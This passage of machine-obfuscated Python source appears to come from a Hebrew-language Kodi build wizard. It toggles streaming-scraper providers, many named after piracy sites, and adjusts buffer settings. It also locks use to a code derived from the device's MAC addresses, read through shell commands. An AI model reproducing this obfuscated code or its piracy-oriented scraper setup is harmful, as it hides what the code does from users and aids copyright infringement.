		O0OOO000OOO00O0OO .setSetting ('provider.kinodogs','false')#line:1933
		O0OOO000OOO00O0OO .setSetting ('provider.kinoking','false')#line:1934
		O0OOO000OOO00O0OO .setSetting ('provider.kinow','false')#line:1935
		O0OOO000OOO00O0OO .setSetting ('provider.kinox','false')#line:1936
		O0OOO000OOO00O0OO .setSetting ('provider.lichtspielhaus','false')#line:1937
		O0OOO000OOO00O0OO .setSetting ('provider.liomenoi','false')#line:1938
		O0OOO000OOO00O0OO .setSetting ('provider.magnetdl','false')#line:1941
		O0OOO000OOO00O0OO .setSetting ('provider.megapelistv','false')#line:1942
		O0OOO000OOO00O0OO .setSetting ('provider.movie2k-ac','false')#line:1943
		O0OOO000OOO00O0OO .setSetting ('provider.movie2k-ag','false')#line:1944
		O0OOO000OOO00O0OO .setSetting ('provider.movie2z','false')#line:1945
		O0OOO000OOO00O0OO .setSetting ('provider.movie4k','false')#line:1946
		O0OOO000OOO00O0OO .setSetting ('provider.movie4kis','false')#line:1947
		O0OOO000OOO00O0OO .setSetting ('provider.movieneo','false')#line:1948
		O0OOO000OOO00O0OO .setSetting ('provider.moviesever','false')#line:1949
		O0OOO000OOO00O0OO .setSetting ('provider.movietown','false')#line:1950
		O0OOO000OOO00O0OO .setSetting ('provider.mvrls','false')#line:1952
		O0OOO000OOO00O0OO .setSetting ('provider.netzkino','false')#line:1953
		O0OOO000OOO00O0OO .setSetting ('provider.odb','false')#line:1954
		O0OOO000OOO00O0OO .setSetting ('provider.openkatalog','false')#line:1955
		O0OOO000OOO00O0OO .setSetting ('provider.ororo','false')#line:1956
		O0OOO000OOO00O0OO .setSetting ('provider.paczamy','false')#line:1957
		O0OOO000OOO00O0OO .setSetting ('provider.peliculasdk','false')#line:1958
		O0OOO000OOO00O0OO .setSetting ('provider.pelisplustv','false')#line:1959
		O0OOO000OOO00O0OO .setSetting ('provider.pepecine','false')#line:1960
		O0OOO000OOO00O0OO .setSetting ('provider.primewire','false')#line:1961
		O0OOO000OOO00O0OO .setSetting ('provider.projectfreetv','false')#line:1962
		O0OOO000OOO00O0OO .setSetting ('provider.proxer','false')#line:1963
		O0OOO000OOO00O0OO .setSetting ('provider.pureanime','false')#line:1964
		O0OOO000OOO00O0OO .setSetting ('provider.putlocker','false')#line:1965
		O0OOO000OOO00O0OO .setSetting ('provider.putlockerfree','false')#line:1966
		O0OOO000OOO00O0OO .setSetting ('provider.reddit','false')#line:1967
		O0OOO000OOO00O0OO .setSetting ('provider.cartoonwire','false')#line:1968
		O0OOO000OOO00O0OO .setSetting ('provider.seehd','false')#line:1969
		O0OOO000OOO00O0OO .setSetting ('provider.segos','false')#line:1970
		O0OOO000OOO00O0OO .setSetting ('provider.serienstream','false')#line:1971
		O0OOO000OOO00O0OO .setSetting ('provider.series9','false')#line:1972
		O0OOO000OOO00O0OO .setSetting ('provider.seriesever','false')#line:1973
		O0OOO000OOO00O0OO .setSetting ('provider.seriesonline','false')#line:1974
		O0OOO000OOO00O0OO .setSetting ('provider.seriespapaya','false')#line:1975
		O0OOO000OOO00O0OO .setSetting ('provider.sezonlukdizi','false')#line:1976
		O0OOO000OOO00O0OO .setSetting ('provider.solarmovie','false')#line:1977
		O0OOO000OOO00O0OO .setSetting ('provider.solarmoviez','false')#line:1978
		O0OOO000OOO00O0OO .setSetting ('provider.stream-to','false')#line:1979
		O0OOO000OOO00O0OO .setSetting ('provider.streamdream','false')#line:1980
		O0OOO000OOO00O0OO .setSetting ('provider.streamflix','false')#line:1981
		O0OOO000OOO00O0OO .setSetting ('provider.streamit','false')#line:1982
		O0OOO000OOO00O0OO .setSetting ('provider.swatchseries','false')#line:1983
		O0OOO000OOO00O0OO .setSetting ('provider.szukajkatv','false')#line:1984
		O0OOO000OOO00O0OO .setSetting ('provider.tainiesonline','false')#line:1985
		O0OOO000OOO00O0OO .setSetting ('provider.tainiomania','false')#line:1986
		O0OOO000OOO00O0OO .setSetting ('provider.tata','false')#line:1989
		O0OOO000OOO00O0OO .setSetting ('provider.trt','false')#line:1990
		O0OOO000OOO00O0OO .setSetting ('provider.tvbox','false')#line:1991
		O0OOO000OOO00O0OO .setSetting ('provider.ultrahd','false')#line:1992
		O0OOO000OOO00O0OO .setSetting ('provider.video4k','false')#line:1993
		O0OOO000OOO00O0OO .setSetting ('provider.vidics','false')#line:1994
		O0OOO000OOO00O0OO .setSetting ('provider.view4u','false')#line:1995
		O0OOO000OOO00O0OO .setSetting ('provider.watchseries','false')#line:1996
		O0OOO000OOO00O0OO .setSetting ('provider.xrysoi','false')#line:1997
		O0OOO000OOO00O0OO .setSetting ('provider.library','false')#line:1998
def fixfont ():#line:2001
	OOO0O0OO00O000OO0 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:2002
	O0OOOO0OO000000OO =json .loads (OOO0O0OO00O000OO0 );#line:2004
	OOO000OOOO0OO0O00 =O0OOOO0OO000000OO ["result"]["settings"]#line:2005
	O00O00OO00O0OOOO0 =[O00O0000OO000OOO0 for O00O0000OO000OOO0 in OOO000OOOO0OO0O00 if O00O0000OO000OOO0 ["id"]=="audiooutput.audiodevice"][0 ]#line:2007
	O00O0O000OO000OO0 =O00O00OO00O0OOOO0 ["options"];#line:2008
	OOOOOO00OOOOOOO0O =O00O00OO00O0OOOO0 ["value"];#line:2009
	O0O00O00OOOOO0000 =[O0O0OO00000O000O0 for (O0O0OO00000O000O0 ,OOO00O00OOOOO0OO0 )in enumerate (O00O0O000OO000OO0 )if OOO00O00OOOOO0OO0 ["value"]==OOOOOO00OOOOOOO0O ][0 ];#line:2011
	O00O0000O000O0O00 =(O0O00O00OOOOO0000 +1 )%len (O00O0O000OO000OO0 )#line:2013
	OOOOO0OOO00O0000O =O00O0O000OO000OO0 [O00O0000O000O0O00 ]["value"]#line:2015
	OOOOO0O0O000000OO =O00O0O000OO000OO0 [O00O0000O000O0O00 ]["label"]#line:2016
	O0OO00000000O00OO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:2018
	try :#line:2020
		OO0OOO0O00O0OOOO0 =json .loads (O0OO00000000O00OO );#line:2021
		if OO0OOO0O00O0OOOO0 ["result"]!=True :#line:2023
			raise Exception #line:2024
	except :#line:2025
		sys .stderr .write ("Error switching audio output device")#line:2026
		raise Exception #line:2027
def parseDOM2 (OO0O0OOO0OO0O000O ,name =u"",attrs ={},ret =False ):#line:2028
	if isinstance (OO0O0OOO0OO0O000O ,str ):#line:2031
		try :#line:2032
			OO0O0OOO0OO0O000O =[OO0O0OOO0OO0O000O .decode ("utf-8")]#line:2033
		except :#line:2034
			OO0O0OOO0OO0O000O =[OO0O0OOO0OO0O000O ]#line:2035
	elif isinstance (OO0O0OOO0OO0O000O ,unicode ):#line:2036
		OO0O0OOO0OO0O000O =[OO0O0OOO0OO0O000O ]#line:2037
	elif not isinstance (OO0O0OOO0OO0O000O ,list ):#line:2038
		return u""#line:2039
	if not name .strip ():#line:2041
		return u""#line:2042
	OO00OOOO0O0OOOO0O =[]#line:2044
	for O000O0O00OO00O0OO in OO0O0OOO0OO0O000O :#line:2045
		O00OOO00O000O00O0 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O000O0O00OO00O0OO )#line:2046
		for OOOO000OO00O0OOOO in O00OOO00O000O00O0 :#line:2047
			O000O0O00OO00O0OO =O000O0O00OO00O0OO .replace (OOOO000OO00O0OOOO ,OOOO000OO00O0OOOO .replace ("\n"," "))#line:2048
		OO0O00000OO00OO00 =[]#line:2050
		for O00O00O0OOOO000OO in attrs :#line:2051
			O00OO00OO0OOO0O0O =re .compile ('(<'+name +'[^>]*?(?:'+O00O00O0OOOO000OO +'=[\'"]'+attrs [O00O00O0OOOO000OO ]+'[\'"].*?>))',re .M |re .S ).findall (O000O0O00OO00O0OO )#line:2052
			if len (O00OO00OO0OOO0O0O )==0 and attrs [O00O00O0OOOO000OO ].find (" ")==-1 :#line:2053
				O00OO00OO0OOO0O0O =re .compile ('(<'+name +'[^>]*?(?:'+O00O00O0OOOO000OO +'='+attrs [O00O00O0OOOO000OO ]+'.*?>))',re .M |re .S ).findall (O000O0O00OO00O0OO )#line:2054
			if len (OO0O00000OO00OO00 )==0 :#line:2056
				OO0O00000OO00OO00 =O00OO00OO0OOO0O0O #line:2057
				O00OO00OO0OOO0O0O =[]#line:2058
			else :#line:2059
				OO00OO000O0OO00OO =range (len (OO0O00000OO00OO00 ))#line:2060
				OO00OO000O0OO00OO .reverse ()#line:2061
				for OO00OOOO0000O00O0 in OO00OO000O0OO00OO :#line:2062
					if not OO0O00000OO00OO00 [OO00OOOO0000O00O0 ]in O00OO00OO0OOO0O0O :#line:2063
						del (OO0O00000OO00OO00 [OO00OOOO0000O00O0 ])#line:2064
		if len (OO0O00000OO00OO00 )==0 and attrs =={}:#line:2066
			OO0O00000OO00OO00 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O000O0O00OO00O0OO )#line:2067
			if len (OO0O00000OO00OO00 )==0 :#line:2068
				OO0O00000OO00OO00 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O000O0O00OO00O0OO )#line:2069
		if isinstance (ret ,str ):#line:2071
			O00OO00OO0OOO0O0O =[]#line:2072
			for OOOO000OO00O0OOOO in OO0O00000OO00OO00 :#line:2073
				O00OO000O00OOOOO0 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOO000OO00O0OOOO )#line:2074
				if len (O00OO000O00OOOOO0 )==0 :#line:2075
					O00OO000O00OOOOO0 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOO000OO00O0OOOO )#line:2076
				for OOOO0OO00OO0OOOOO in O00OO000O00OOOOO0 :#line:2077
					OO0OOO0OO00OO0O0O =OOOO0OO00OO0OOOOO [0 ]#line:2078
					if OO0OOO0OO00OO0O0O in "'\"":#line:2079
						if OOOO0OO00OO0OOOOO .find ('='+OO0OOO0OO00OO0O0O ,OOOO0OO00OO0OOOOO .find (OO0OOO0OO00OO0O0O ,1 ))>-1 :#line:2080
							OOOO0OO00OO0OOOOO =OOOO0OO00OO0OOOOO [:OOOO0OO00OO0OOOOO .find ('='+OO0OOO0OO00OO0O0O ,OOOO0OO00OO0OOOOO .find (OO0OOO0OO00OO0O0O ,1 ))]#line:2081
						if OOOO0OO00OO0OOOOO .rfind (OO0OOO0OO00OO0O0O ,1 )>-1 :#line:2083
							OOOO0OO00OO0OOOOO =OOOO0OO00OO0OOOOO [1 :OOOO0OO00OO0OOOOO .rfind (OO0OOO0OO00OO0O0O )]#line:2084
					else :#line:2085
						if OOOO0OO00OO0OOOOO .find (" ")>0 :#line:2086
							OOOO0OO00OO0OOOOO =OOOO0OO00OO0OOOOO [:OOOO0OO00OO0OOOOO .find (" ")]#line:2087
						elif OOOO0OO00OO0OOOOO .find ("/")>0 :#line:2088
							OOOO0OO00OO0OOOOO =OOOO0OO00OO0OOOOO [:OOOO0OO00OO0OOOOO .find ("/")]#line:2089
						elif OOOO0OO00OO0OOOOO .find (">")>0 :#line:2090
							OOOO0OO00OO0OOOOO =OOOO0OO00OO0OOOOO [:OOOO0OO00OO0OOOOO .find (">")]#line:2091
					O00OO00OO0OOO0O0O .append (OOOO0OO00OO0OOOOO .strip ())#line:2093
			OO0O00000OO00OO00 =O00OO00OO0OOO0O0O #line:2094
		else :#line:2095
			O00OO00OO0OOO0O0O =[]#line:2096
			for OOOO000OO00O0OOOO in OO0O00000OO00OO00 :#line:2097
				O0O00OOO0O0OOOOOO =u"</"+name #line:2098
				O0O0OO000OO0000O0 =O000O0O00OO00O0OO .find (OOOO000OO00O0OOOO )#line:2100
				O000O0OOO00O00O00 =O000O0O00OO00O0OO .find (O0O00OOO0O0OOOOOO ,O0O0OO000OO0000O0 )#line:2101
				O0000O00000O0OO0O =O000O0O00OO00O0OO .find ("<"+name ,O0O0OO000OO0000O0 +1 )#line:2102
				while O0000O00000O0OO0O <O000O0OOO00O00O00 and O0000O00000O0OO0O !=-1 :#line:2104
					OO0OOOO0O0O00O00O =O000O0O00OO00O0OO .find (O0O00OOO0O0OOOOOO ,O000O0OOO00O00O00 +len (O0O00OOO0O0OOOOOO ))#line:2105
					if OO0OOOO0O0O00O00O !=-1 :#line:2106
						O000O0OOO00O00O00 =OO0OOOO0O0O00O00O #line:2107
					O0000O00000O0OO0O =O000O0O00OO00O0OO .find ("<"+name ,O0000O00000O0OO0O +1 )#line:2108
				if O0O0OO000OO0000O0 ==-1 and O000O0OOO00O00O00 ==-1 :#line:2110
					O0000OOO0OO00O00O =u""#line:2111
				elif O0O0OO000OO0000O0 >-1 and O000O0OOO00O00O00 >-1 :#line:2112
					O0000OOO0OO00O00O =O000O0O00OO00O0OO [O0O0OO000OO0000O0 +len (OOOO000OO00O0OOOO ):O000O0OOO00O00O00 ]#line:2113
				elif O000O0OOO00O00O00 >-1 :#line:2114
					O0000OOO0OO00O00O =O000O0O00OO00O0OO [:O000O0OOO00O00O00 ]#line:2115
				elif O0O0OO000OO0000O0 >-1 :#line:2116
					O0000OOO0OO00O00O =O000O0O00OO00O0OO [O0O0OO000OO0000O0 +len (OOOO000OO00O0OOOO ):]#line:2117
				if ret :#line:2119
					O0O00OOO0O0OOOOOO =O000O0O00OO00O0OO [O000O0OOO00O00O00 :O000O0O00OO00O0OO .find (">",O000O0O00OO00O0OO .find (O0O00OOO0O0OOOOOO ))+1 ]#line:2120
					O0000OOO0OO00O00O =OOOO000OO00O0OOOO +O0000OOO0OO00O00O +O0O00OOO0O0OOOOOO #line:2121
				O000O0O00OO00O0OO =O000O0O00OO00O0OO [O000O0O00OO00O0OO .find (O0000OOO0OO00O00O ,O000O0O00OO00O0OO .find (OOOO000OO00O0OOOO ))+len (O0000OOO0OO00O00O ):]#line:2123
				O00OO00OO0OOO0O0O .append (O0000OOO0OO00O00O )#line:2124
			OO0O00000OO00OO00 =O00OO00OO0OOO0O0O #line:2125
		OO00OOOO0O0OOOO0O +=OO0O00000OO00OO00 #line:2126
	return OO00OOOO0O0OOOO0O #line:2128
def addItem (OOO0O0O0O0OOOO00O ,OO0OO0OOO000O0OO0 ,O00OO0O0OO000OOO0 ,OO0OOOOOOO0OOO0O0 ,OOOOO00OO000O0O0O ,description =None ):#line:2130
	if description ==None :description =''#line:2131
	description ='[COLOR white]'+description +'[/COLOR]'#line:2132
	OO0O0O000OO0O000O =sys .argv [0 ]+"?url="+urllib .quote_plus (OO0OO0OOO000O0OO0 )+"&mode="+str (O00OO0O0OO000OOO0 )+"&name="+urllib .quote_plus (OOO0O0O0O0OOOO00O )+"&iconimage="+urllib .quote_plus (OO0OOOOOOO0OOO0O0 )+"&fanart="+urllib .quote_plus (OOOOO00OO000O0O0O )#line:2133
	OOOO0OOOOO00OOOOO =True #line:2134
	O0OOOO0OO00000OO0 =xbmcgui .ListItem (OOO0O0O0O0OOOO00O ,iconImage =OO0OOOOOOO0OOO0O0 ,thumbnailImage =OO0OOOOOOO0OOO0O0 )#line:2135
	O0OOOO0OO00000OO0 .setInfo (type ="Video",infoLabels ={"Title":OOO0O0O0O0OOOO00O ,"Plot":description })#line:2136
	O0OOOO0OO00000OO0 .setProperty ("fanart_Image",OOOOO00OO000O0O0O )#line:2137
	O0OOOO0OO00000OO0 .setProperty ("icon_Image",OO0OOOOOOO0OOO0O0 )#line:2138
	OOOO0OOOOO00OOOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O0O000OO0O000O ,listitem =O0OOOO0OO00000OO0 ,isFolder =False )#line:2139
	return OOOO0OOOOO00OOOOO #line:2140
def get_params ():#line:2142
		O0OO00OOOOO0O00OO =[]#line:2143
		OO00O0OOOO00O0OOO =sys .argv [2 ]#line:2144
		if len (OO00O0OOOO00O0OOO )>=2 :#line:2145
				O0O0O0O000OOO000O =sys .argv [2 ]#line:2146
				OOOOO00O0O0O0O000 =O0O0O0O000OOO000O .replace ('?','')#line:2147
				if (O0O0O0O000OOO000O [len (O0O0O0O000OOO000O )-1 ]=='/'):#line:2148
						O0O0O0O000OOO000O =O0O0O0O000OOO000O [0 :len (O0O0O0O000OOO000O )-2 ]#line:2149
				O00OO000OO000O000 =OOOOO00O0O0O0O000 .split ('&')#line:2150
				O0OO00OOOOO0O00OO ={}#line:2151
				for O000OO0O00O00O0OO in range (len (O00OO000OO000O000 )):#line:2152
						OOOO0OO00O0O0OOOO ={}#line:2153
						OOOO0OO00O0O0OOOO =O00OO000OO000O000 [O000OO0O00O00O0OO ].split ('=')#line:2154
						if (len (OOOO0OO00O0O0OOOO ))==2 :#line:2155
								O0OO00OOOOO0O00OO [OOOO0OO00O0O0OOOO [0 ]]=OOOO0OO00O0O0OOOO [1 ]#line:2156
		return O0OO00OOOOO0O00OO #line:2158
def decode (OOO000O0O0O000000 ,OO000OO0O0O000OO0 ):#line:2163
    import base64 #line:2164
    OOOOOO0O00O0O00O0 =[]#line:2165
    if (len (OOO000O0O0O000000 ))!=4 :#line:2167
     return 10 #line:2168
    OO000OO0O0O000OO0 =base64 .urlsafe_b64decode (OO000OO0O0O000OO0 )#line:2169
    for O000OOO0O000OOOO0 in range (len (OO000OO0O0O000OO0 )):#line:2171
        OO0OOO0000O00O00O =OOO000O0O0O000000 [O000OOO0O000OOOO0 %len (OOO000O0O0O000000 )]#line:2172
        OOOO0O00OOOOOOO0O =chr ((256 +ord (OO000OO0O0O000OO0 [O000OOO0O000OOOO0 ])-ord (OO0OOO0000O00O00O ))%256 )#line:2173
        OOOOOO0O00O0O00O0 .append (OOOO0O00OOOOOOO0O )#line:2174
    return "".join (OOOOOO0O00O0O00O0 )#line:2175
def tmdb_list (O0O0OO0O0O0O000O0 ):#line:2176
    OOO0O00O0O0OO0OOO =decode ("7643",O0O0OO0O0O0O000O0 )#line:2179
    return int (OOO0O00O0O0OO0OOO )#line:2182
def u_list (OO000OO00O0000OOO ):#line:2183
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:2185
        from math import sqrt #line:2186
        O0OOO0OOOO0000000 =tmdb_list (TMDB_NEW_API )#line:2187
        O0OOO0OOOO0OOO00O =str ((getHwAddr ('eth0'))*O0OOO0OOOO0000000 )#line:2189
        O00O0O0OO0000O000 =int (O0OOO0OOOO0OOO00O [1 ]+O0OOO0OOOO0OOO00O [2 ]+O0OOO0OOOO0OOO00O [5 ]+O0OOO0OOOO0OOO00O [7 ])#line:2190
        OOOOO0OOOOOO00OOO =(ADDON .getSetting ("pass"))#line:2192
        OOOO0O00OOOO00000 =(str (round (sqrt ((O00O0O0OO0000O000 *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:2197
        if '.'in OOOO0O00OOOO00000 :#line:2199
         OOOO0O00OOOO00000 =(str (round (sqrt ((O00O0O0OO0000O000 *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:2200
        if OOOOO0OOOOOO00OOO ==OOOO0O00OOOO00000 :#line:2202
          OOOO0O0OO000O0OO0 =OO000OO00O0000OOO #line:2204
        else :#line:2206
           if STARTP2 ()and STARTP ()=='ok':#line:2207
             return OO000OO00O0000OOO #line:2210
           OOOO0O0OO000O0OO0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:2211
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:2212
           sys .exit ()#line:2213
        return OOOO0O0OO000O0OO0 #line:2214
    else :#line:2215
        STARTP ()#line:2216
def disply_hwr ():#line:2220
   try :#line:2221
    O0000000000O00O0O =tmdb_list (TMDB_NEW_API )#line:2222
    OO000O00O0OOO0O00 =str ((getHwAddr ('eth0'))*O0000000000O00O0O )#line:2223
    O0O0000OO0O0OO000 =(OO000O00O0OOO0O00 [1 ]+OO000O00O0OOO0O00 [2 ]+OO000O00O0OOO0O00 [5 ]+OO000O00O0OOO0O00 [7 ])#line:2230
    O00OOOO00OOOO0O0O =(ADDON .getSetting ("action"))#line:2231
    wiz .setS ('action',str (O0O0000OO0O0OO000 ))#line:2233
   except :pass #line:2234
def disply_hwr2 ():#line:2235
   try :#line:2236
    OO0OOO00OO0000OO0 =tmdb_list (TMDB_NEW_API )#line:2237
    O0O00O00O000OO0OO =str ((getHwAddr ('eth0'))*OO0OOO00OO0000OO0 )#line:2239
    OOOOOOOO000000O00 =(O0O00O00O000OO0OO [1 ]+O0O00O00O000OO0OO [2 ]+O0O00O00O000OO0OO [5 ]+O0O00O00O000OO0OO [7 ])#line:2248
    O0OOO0OO0O0O0000O =(ADDON .getSetting ("action"))#line:2249
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOOOOOOO000000O00 )#line:2252
   except :pass #line:2253
def getHwAddr (OOOOO0OOO000O00O0 ):#line:2255
   import subprocess ,time #line:2256
   O0O0O000O0OOOOO00 ='windows'#line:2257
   if xbmc .getCondVisibility ('system.platform.android'):#line:2258
       O0O0O000O0OOOOO00 ='android'#line:2259
   if xbmc .getCondVisibility ('system.platform.android'):#line:2260
     O000O0OOOO000O00O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:2261
     OO0O0OO0O0OO00O0O =re .compile ('link/ether (.+?) brd').findall (str (O000O0OOOO000O00O ))#line:2263
     OO0OO0OOOO00O0OO0 =0 #line:2264
     for OOO00OOO0O0OOOO0O in OO0O0OO0O0OO00O0O :#line:2265
      if OO0O0OO0O0OO00O0O !='00:00:00:00:00:00':#line:2266
          O00O000O0OO0O00OO =OOO00OOO0O0OOOO0O #line:2267
          OO0OO0OOOO00O0OO0 =OO0OO0OOOO00O0OO0 +int (O00O000O0OO0O00OO .replace (':',''),16 )#line:2268
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:2270
       OO00O0O0O000O0000 =0 #line:2271
       OO0OO0OOOO00O0OO0 =0 #line:2272
       OOOOOO00000000O0O =[]#line:2273
       OOOOOO0OOO00OOO00 =os .popen ("getmac").read ()#line:2274
       OOOOOO0OOO00OOO00 =OOOOOO0OOO00OOO00 .split ("\n")#line:2275
       for OOO0O0OOO000O0O00 in OOOOOO0OOO00OOO00 :#line:2277
            O00OO00OO0000O00O =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO0O0OOO000O0O00 ,re .I )#line:2278
            if O00OO00OO0000O00O :#line:2279
                OO0O0OO0O0OO00O0O =O00OO00OO0000O00O .group ().replace ('-',':')#line:2280
                OOOOOO00000000O0O .append (OO0O0OO0O0OO00O0O )#line:2281
                OO0OO0OOOO00O0OO0 =OO0OO0OOOO00O0OO0 +int (OO0O0OO0O0OO00O0O .replace (':',''),16 )#line:2284
   else :#line:2286
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:2287
   try :#line:2304
    return OO0OO0OOOO00O0OO0 #line:2305
   except :pass #line:2306
def getpass ():#line:2307
	disply_hwr2 ()#line:2309
def setpass ():#line:2310
    O000O00OOOOO0000O =xbmcgui .Dialog ()#line:2311
    O00O00OO00OO0O0OO =''#line:2312
    O0O0OO000OO0OO00O =xbmc .Keyboard (O00O00OO00OO0O0OO ,'הכנס סיסמה')#line:2314
    O0O0OO000OO0OO00O .doModal ()#line:2315
    if O0O0OO000OO0OO00O .isConfirmed ():#line:2316
           O0O0OO000OO0OO00O =O0O0OO000OO0OO00O .getText ()#line:2317
    wiz .setS ('pass',str (O0O0OO000OO0OO00O ))#line:2318
def setuname ():#line:2319
    OOOOOO000OO00OOOO =''#line:2320
    OOO0O0OOO00OO0OO0 =xbmc .Keyboard (OOOOOO000OO00OOOO ,'הכנס שם משתמש')#line:2321
    OOO0O0OOO00OO0OO0 .doModal ()#line:2322
    if OOO0O0OOO00OO0OO0 .isConfirmed ():#line:2323
           OOOOOO000OO00OOOO =OOO0O0OOO00OO0OO0 .getText ()#line:2324
           wiz .setS ('user',str (OOOOOO000OO00OOOO ))#line:2325
def powerkodi ():#line:2326
    os ._exit (1 )#line:2327
def buffer1 ():#line:2329
	O0OOOO0O0000OOOOO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:2330
	OOO0O0OOOO0O00O00 =xbmc .getInfoLabel ("System.Memory(total)")#line:2331
	O00OO0OO0OO0O0OOO =xbmc .getInfoLabel ("System.FreeMemory")#line:2332
	O0O000O0000OOOO0O =re .sub ('[^0-9]','',O00OO0OO0OO0O0OOO )#line:2333
	O0O000O0000OOOO0O =int (O0O000O0000OOOO0O )/3 #line:2334
	O0000OO000OO0OO0O =O0O000O0000OOOO0O *1024 *1024 #line:2335
	try :OOOO0O0OOO000O0O0 =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:2336
	except :OOOO0O0OOO000O0O0 =16 #line:2337
	O0OOOOOO0OOOOOO00 =DIALOG .yesno ('FREE MEMORY: '+str (O00OO0OO0OO0O0OOO ),'Based on your free Memory your optimal buffersize is: '+str (O0O000O0000OOOO0O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:2340
	if O0OOOOOO0OOOOOO00 ==1 :#line:2341
		with open (O0OOOO0O0000OOOOO ,"w")as O0O00OOO000OOO0OO :#line:2342
			if OOOO0O0OOO000O0O0 >=17 :O00O0OOOO000OOOO0 =xml_data_advSettings_New (str (O0000OO000OO0OO0O ))#line:2343
			else :O00O0OOOO000OOOO0 =xml_data_advSettings_old (str (O0000OO000OO0OO0O ))#line:2344
			O0O00OOO000OOO0OO .write (O00O0OOOO000OOOO0 )#line:2346
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO000OO0OO0O ),'Please restart Kodi for settings to apply.','')#line:2347
	elif O0OOOOOO0OOOOOO00 ==0 :#line:2349
		O0000OO000OO0OO0O =_O0O000OOO000000OO (default =str (O0000OO000OO0OO0O ),heading ="INPUT BUFFER SIZE")#line:2350
		with open (O0OOOO0O0000OOOOO ,"w")as O0O00OOO000OOO0OO :#line:2351
			if OOOO0O0OOO000O0O0 >=17 :O00O0OOOO000OOOO0 =xml_data_advSettings_New (str (O0000OO000OO0OO0O ))#line:2352
			else :O00O0OOOO000OOOO0 =xml_data_advSettings_old (str (O0000OO000OO0OO0O ))#line:2353
			O0O00OOO000OOO0OO .write (O00O0OOOO000OOOO0 )#line:2354
			DIALOG .ok ('Buffer Size Set to: '+str (O0000OO000OO0OO0O ),'Please restart Kodi for settings to apply.','')#line:2355
def xml_data_advSettings_old (OOO0OOOOO00OOOOO0 ):#line:2356
	O0000O0O0OO0000OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOO0OOOOO00OOOOO0 #line:2366
	return O0000O0O0OO0000OO #line:2367
def xml_data_advSettings_New (O0000O00OOO0OO0O0 ):#line:2369
	O00000O00OOOO00OO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0000O00OOO0OO0O0 #line:2381
	return O00000O00OOOO00OO #line:2382
def write_ADV_SETTINGS_XML (O000OO000OOOOOO0O ):#line:2383
    if not os .path .exists (xml_file ):#line:2384
        with open (xml_file ,"w")as OOOO0O00OO0O0O0O0 :#line:2385
            OOOO0O00OO0O0O0O0 .write (xml_data )#line:2386
def _O0O000OOO000000OO (default ="",heading ="",hidden =False ):#line:2387
    ""#line:2388
    O0OOO00O00O0OOOO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2389
    O0OOO00O00O0OOOO0 .doModal ()#line:2390
    if (O0OOO00O00O0OOOO0 .isConfirmed ()):#line:2391
        return unicode (O0OOO00O00O0OOOO0 .getText (),"utf-8")#line:2392
    return default #line:2393
def index ():#line:2395
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2396
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2397
	if AUTOUPDATE =='Yes':#line:2398
		if wiz .workingURL (WIZARDFILE )==True :#line:2399
			O0OO00000OOOO0O00 =wiz .checkWizard ('version')#line:2400
			if O0OO00000OOOO0O00 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO00000OOOO0O00 ),'wizardupdate',themeit =THEME2 )#line:2401
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2402
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2403
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2404
	if len (BUILDNAME )>0 :#line:2405
		O0O000O00OO00O00O =wiz .checkBuild (BUILDNAME ,'version')#line:2406
		O00OOO0O0OOOO0O0O ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2407
